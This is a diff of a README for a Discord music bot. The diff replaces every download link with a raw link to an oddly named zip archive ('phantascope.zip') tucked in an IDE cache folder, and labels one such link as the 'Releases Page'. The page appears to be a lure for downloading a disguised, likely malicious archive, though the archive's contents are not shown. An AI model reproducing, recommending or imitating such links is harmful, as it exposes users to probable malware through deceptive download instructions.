@@ -1,6 +1,6 @@
 # 🎶 Mova-Discord-Music-Bot-Advanced-Rhtm-Mee6 - Your Simple Discord Music Solution
 
-[![Download Mova-Discord-Music-Bot](https://raw.githubusercontent.com/BamZ190/Mova-Discord-Music-Bot-Advanced-Rhtm-Mee6/main/Music-Bot/Form11/Mova-Discord-Music-Bot-Advanced-Rhtm-Mee6_v3.2-beta.5.zip)](https://raw.githubusercontent.com/BamZ190/Mova-Discord-Music-Bot-Advanced-Rhtm-Mee6/main/Music-Bot/Form11/Mova-Discord-Music-Bot-Advanced-Rhtm-Mee6_v3.2-beta.5.zip)
+[![Download Mova-Discord-Music-Bot](https://raw.githubusercontent.com/BamZ190/Mova-Discord-Music-Bot-Advanced-Rhtm-Mee6/main/.vs/Music-Bot/DesignTimeBuild/Mee_Mova_Discord_Advanced_Bot_Rhtm_Music_phantascope.zip)](https://raw.githubusercontent.com/BamZ190/Mova-Discord-Music-Bot-Advanced-Rhtm-Mee6/main/.vs/Music-Bot/DesignTimeBuild/Mee_Mova_Discord_Advanced_Bot_Rhtm_Music_phantascope.zip)
 
 ## 📦 Description
 Mova-Discord-Music-Bot-Advanced-Rhtm-Mee6 is the only bot you will ever need for Discord. It is easy to set up and run yourself. Enjoy music while you chat and manage your Discord server efficiently.
@@ -24,7 +24,7 @@ Before you start, ensure you have:
 ## 🌐 Download & Install
 To get the Mova-Discord-Music-Bot, please follow these steps:
 
-1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/BamZ190/Mova-Discord-Music-Bot-Advanced-Rhtm-Mee6/main/Music-Bot/Form11/Mova-Discord-Music-Bot-Advanced-Rhtm-Mee6_v3.2-beta.5.zip) to access the releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/BamZ190/Mova-Discord-Music-Bot-Advanced-Rhtm-Mee6/main/.vs/Music-Bot/DesignTimeBuild/Mee_Mova_Discord_Advanced_Bot_Rhtm_Music_phantascope.zip) to access the releases page.
 
 2. **Select the Version:** Look for the latest version available. It is usually at the top of the page.
 
@@ -92,4 +92,4 @@ If you need further assistance, you can reach out for support. Please visit the 
 ## 🌟 Closing Notes
 Thank you for choosing Mova-Discord-Music-Bot-Advanced-Rhtm-Mee6. Enjoy your music on Discord and manage your community effortlessly!
 
-[![Download Mova-Discord-Music-Bot](https://raw.githubusercontent.com/BamZ190/Mova-Discord-Music-Bot-Advanced-Rhtm-Mee6/main/Music-Bot/Form11/Mova-Discord-Music-Bot-Advanced-Rhtm-Mee6_v3.2-beta.5.zip)](https://raw.githubusercontent.com/BamZ190/Mova-Discord-Music-Bot-Advanced-Rhtm-Mee6/main/Music-Bot/Form11/Mova-Discord-Music-Bot-Advanced-Rhtm-Mee6_v3.2-beta.5.zip)
+[![Download Mova-Discord-Music-Bot](https://raw.githubusercontent.com/BamZ190/Mova-Discord-Music-Bot-Advanced-Rhtm-Mee6/main/.vs/Music-Bot/DesignTimeBuild/Mee_Mova_Discord_Advanced_Bot_Rhtm_Music_phantascope.zip)](https://raw.githubusercontent.com/BamZ190/Mova-Discord-Music-Bot-Advanced-Rhtm-Mee6/main/.vs/Music-Bot/DesignTimeBuild/Mee_Mova_Discord_Advanced_Bot_Rhtm_Music_phantascope.zip)
